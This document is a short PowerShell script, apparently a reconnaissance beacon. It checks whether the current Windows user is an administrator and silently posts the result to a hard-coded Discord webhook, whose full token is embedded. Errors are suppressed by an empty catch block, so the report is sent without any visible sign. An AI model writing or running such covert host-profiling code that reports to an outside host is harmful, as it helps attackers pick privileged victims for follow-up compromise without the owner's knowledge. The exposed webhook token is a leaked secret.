[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$webhook = 'https://discord.com/api/webhooks/1433909453215895633/65nCYDENhbIopI5vyqig-GbrPkTJVsdBh-PLhnPawm0OrPGV0T_48Brv4pBLePmsVBLZ'

$admin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
$msg = if ($admin) { 'Admin' } else { 'Not admin' }

try {
    Invoke-RestMethod -Uri $webhook -Method Post -Body (@{content=$msg} | ConvertTo-Json) -ContentType 'application/json' | Out-Null
} catch {}
